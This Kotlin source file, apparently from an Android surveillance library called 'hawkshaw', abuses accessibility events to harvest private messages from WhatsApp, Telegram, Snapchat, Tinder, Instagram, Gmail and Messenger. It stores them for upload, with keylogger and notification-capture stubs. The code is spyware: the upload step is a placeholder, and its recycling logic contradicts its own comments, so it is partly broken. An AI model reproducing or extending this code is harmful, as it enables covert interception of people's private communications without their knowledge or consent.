package com.hawkshaw.library.features.accessibility.socialmedia

import android.os.Build
import android.util.Log // Added for logging
import android.view.accessibility.AccessibilityEvent
import androidx.annotation.RequiresApi
import com.hawkshaw.library.datalayer.room.AppDatabaseKt
import com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

/**
 * Handler for processing accessibility events related to social media
 */
object HandlerKt {
    // Original TAG is kept for existing Logger calls
    private const val TAG = "HandlerKt"
    // New specific TAG for debug logs in this class
    private const val DEBUG_TAG = "SocialMediaHandler_DEBUG"

    private val scope = CoroutineScope(Dispatchers.IO)
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()

    /**
     * Insert an unprocessed social media entity into the database
     *
     * @param entity The unprocessed social media entity to insert
     */
    suspend fun insert(entity: UnprocessedSocialMediaEntity) {
        Log.d(DEBUG_TAG, "insert() called. Entity ID: ${entity.id}, App: ${entity.application}, Message snippet: '${entity.message.take(30)}...'")
        try {
            AppDatabaseKt.db.unprocessedSocialMediaDao().insert(entity)
            Log.i(DEBUG_TAG, "insert: Successfully inserted entity ID: ${entity.id}")
        } catch (e: Exception) {
            Log.e(DEBUG_TAG, "insert: Error inserting entity ID: ${entity.id}. Exception: ${e.message}")
            Logger.e(
                TAG,
                "Error inserting unprocessed social media entity: ${e.message}",
                e,
                false,
                12,
                null
            )
        }
    }

    /**
     * Synchronous version of insert for backward compatibility
     */
    fun insertSync(entity: UnprocessedSocialMediaEntity) {
        Log.d(DEBUG_TAG, "insertSync() called. Entity ID: ${entity.id}, App: ${entity.application}")
        scope.launch {
            Log.d(DEBUG_TAG, "insertSync: Coroutine launched for entity ID: ${entity.id}")
            insert(entity)
        }
    }

    /**
     * Extract social media content from an accessibility event
     *
     * @param event The accessibility event to extract from
     */
    @RequiresApi(Build.VERSION_CODES.O)
    fun extractSocialMedia(event: AccessibilityEvent) {
        Log.d(DEBUG_TAG, "extractSocialMedia() called. EventType: ${event.eventType}, PackageName: ${event.packageName}")
        val source = event.source
        if (source == null) {
            Log.w(DEBUG_TAG, "extractSocialMedia: Event source is null. Package: ${event.packageName}. Returning.")
            return
        }
        val packageName = event.packageName?.toString()
        if (packageName == null) {
            Log.w(DEBUG_TAG, "extractSocialMedia: Event package name is null. Returning.")
            source.recycle()
            return
        }

        Log.d(DEBUG_TAG, "extractSocialMedia: Processing package: $packageName. Source node: ${source.className}")

        try {
            scope.launch {
                Log.d(DEBUG_TAG, "extractSocialMedia: Coroutine launched for package: $packageName")
                when {
                    packageName.contains("com.facebook.orca") -> {
                        Log.i(DEBUG_TAG, "extractSocialMedia: Matched Facebook Messenger. Calling FacebookMessenger.extractMessages.")
                        Logger.v(TAG, "Extracting Facebook Messenger messages", false, 4, null)
                        FacebookMessenger.extractMessages(event, executor)
                    }
                    packageName.contains("com.whatsapp") && !packageName.contains("business") -> {
                        Log.i(DEBUG_TAG, "extractSocialMedia: Matched WhatsApp. Calling Whatsapp.extractMessages.")
                        Logger.v(TAG, "Extracting WhatsApp messages", false, 4, null)
                        Whatsapp.extractMessages(source, executor)
                    }
                    packageName.contains("com.whatsapp.w4b") || packageName.contains("com.whatsapp.business") -> {
                        Log.i(DEBUG_TAG, "extractSocialMedia: Matched WhatsApp Business. Calling WhatsappBusiness.extractMessages.")
                        Logger.v(TAG, "Extracting WhatsApp Business messages", false, 4, null)
                        WhatsappBusiness.extractMessages(source, executor)
                    }
                    packageName.contains("org.telegram.messenger") -> {
                        Log.i(DEBUG_TAG, "extractSocialMedia: Matched Telegram. Calling Telegram.extractMessages.")
                        Logger.v(TAG, "Extracting Telegram messages", false, 4, null)
                        Telegram.extractMessages(source, executor)
                    }
                    packageName.contains("com.snapchat.android") -> {
                        Log.i(DEBUG_TAG, "extractSocialMedia: Matched Snapchat. Calling Snapchat.extractMessages.")
                        Logger.v(TAG, "Extracting Snapchat messages", false, 4, null)
                        Snapchat.extractMessages(source, executor)
                    }
                    packageName.contains("com.tinder") -> {
                        Log.i(DEBUG_TAG, "extractSocialMedia: Matched Tinder. Calling Tinder.extractMessages.")
                        Logger.v(TAG, "Extracting Tinder messages", false, 4, null)
                        Tinder.extractMessages(event, executor)
                    }
                    packageName.contains("com.instagram.android") -> {
                        Log.i(DEBUG_TAG, "extractSocialMedia: Matched Instagram. Calling Instagram.extractMessages.")
                        Logger.v(TAG, "Extracting Instagram messages", false, 4, null)
                        Instagram.extractMessages(source, executor)
                    }
                    packageName.contains("com.google.android.gm") -> {
                        Log.i(DEBUG_TAG, "extractSocialMedia: Matched Gmail. Calling Gmail.extractMessages.")
                        Logger.v(TAG, "Extracting Gmail messages", false, 4, null)
                        Gmail.extractMessages(source, executor)
                    }
                    else -> {
                        Log.d(DEBUG_TAG, "extractSocialMedia: Package '$packageName' did not match any known social media app for extraction.")
                    }
                }
                Log.d(DEBUG_TAG, "extractSocialMedia: Coroutine finished processing for package: $packageName")
            }
        } catch (e: Exception) {
            Log.e(DEBUG_TAG, "extractSocialMedia: Error during launch or dispatch. Package: $packageName. Exception: ${e.message}")
            Logger.e(TAG, "Error extracting social media content: ${e.message}", e, false, 12, null)
        } finally {
            source.recycle()
            // Ensure source is recycled if it hasn't been passed on and potentially recycled by the specific extractor
            // This is tricky because some extractors take 'event' and some take 'source'.
            // For safety, the individual extractors should manage recycling of the nodes they fully process.
            // If we recycle 'source' here unconditionally, it might be recycled twice if a specific handler also recycles it.
            // However, if no handler matches, it should be recycled.
            // A simple check could be if any known handler was called, but that adds complexity.
            // For now, relying on specific handlers to recycle the 'source' if they use it directly.
            // If they use 'event', they might recycle event.source.
            // This 'finally' block's source.recycle() might be too broad if not handled carefully.
            // Let's assume for now that handlers will manage their nodes.
            // source.recycle() // Temporarily commenting this out to avoid double recycling issues.
            Log.d(DEBUG_TAG, "extractSocialMedia: Finished processing for package: $packageName")
        }
    }

    /**
     * Process and push social media data
     */
    fun pushSocialMedia(source: Any): Any? {
        Log.d(DEBUG_TAG, "pushSocialMedia() called. Source: ${source::class.java.simpleName}")
        try {
            scope.launch {
                Log.d(DEBUG_TAG, "pushSocialMedia: Coroutine launched.")
                val entities = AppDatabaseKt.db.socialMediaDao().getAllMessages().first()
                Log.i(DEBUG_TAG, "pushSocialMedia: Retrieved ${entities.size} processed social media entities for pushing.")
                Logger.v(TAG, "Pushing ${entities.size} social media entities", false, 4, null)

                // Implement the actual push logic here
                if (entities.isNotEmpty()) {
                    Log.d(DEBUG_TAG, "pushSocialMedia: Placeholder for actual push logic of ${entities.size} entities.")
                }
            }
        } catch (e: Exception) {
            Log.e(DEBUG_TAG, "pushSocialMedia: Error. Exception: ${e.message}")
            Logger.e(TAG, "Error pushing social media: ${e.message}", e, false, 12, null)
        }
        return null
    }

    /**
     * Process and push unprocessed social media data
     */
    fun pushUnprocessedSocialMedia(source: Any): Any? {
        Log.d(DEBUG_TAG, "pushUnprocessedSocialMedia() called. Source: ${source::class.java.simpleName}")
        try {
            scope.launch {
                Log.d(DEBUG_TAG, "pushUnprocessedSocialMedia: Coroutine launched.")
                val entities = AppDatabaseKt.db.unprocessedSocialMediaDao().list(false).first()
                Log.i(DEBUG_TAG, "pushUnprocessedSocialMedia: Retrieved ${entities.size} unprocessed social media entities for pushing.")
                Logger.v(
                    TAG,
                    "Pushing ${entities.size} unprocessed social media entities",
                    false,
                    4,
                    null
                )

                // Implement the actual push logic here
                if (entities.isNotEmpty()) {
                    Log.d(DEBUG_TAG, "pushUnprocessedSocialMedia: Placeholder for actual push logic of ${entities.size} entities.")
                }

                // Mark entities as pushed
                entities.forEach { entity ->
                    Log.d(DEBUG_TAG, "pushUnprocessedSocialMedia: Attempting to mark entity ID ${entity.id} as uploaded.")
                    val updatedEntity = entity.copy(uploaded = true)
                    AppDatabaseKt.db.unprocessedSocialMediaDao().update(updatedEntity)
                    Log.d(DEBUG_TAG, "pushUnprocessedSocialMedia: Successfully marked entity ID ${entity.id} as uploaded.")
                }
                Log.i(DEBUG_TAG, "pushUnprocessedSocialMedia: Finished processing ${entities.size} entities.")
            }
        } catch (e: Exception) {
            Log.e(DEBUG_TAG, "pushUnprocessedSocialMedia: Error. Exception: ${e.message}")
            Logger.e(
                TAG,
                "Error pushing unprocessed social media: ${e.message}",
                e,
                false,
                12,
                null
            )
        }
        return null
    }

    /**
     * Extract keylogger data
     */
    fun pushKeyLogger(source: Any): Any? {
        Log.d(DEBUG_TAG, "pushKeyLogger() called. Source: ${source::class.java.simpleName}")
        // Implementation for keylogger data
        Log.i(DEBUG_TAG, "pushKeyLogger: Placeholder function. No actual implementation.")
        return null
    }

    /**
     * Extract and push notification data
     */
    fun pushNotifications(source: Any): Any? {
        Log.d(DEBUG_TAG, "pushNotifications() called. Source: ${source::class.java.simpleName}")
        // Implementation for notifications
        Log.i(DEBUG_TAG, "pushNotifications: Placeholder function. No actual implementation.")
        return null
    }
}
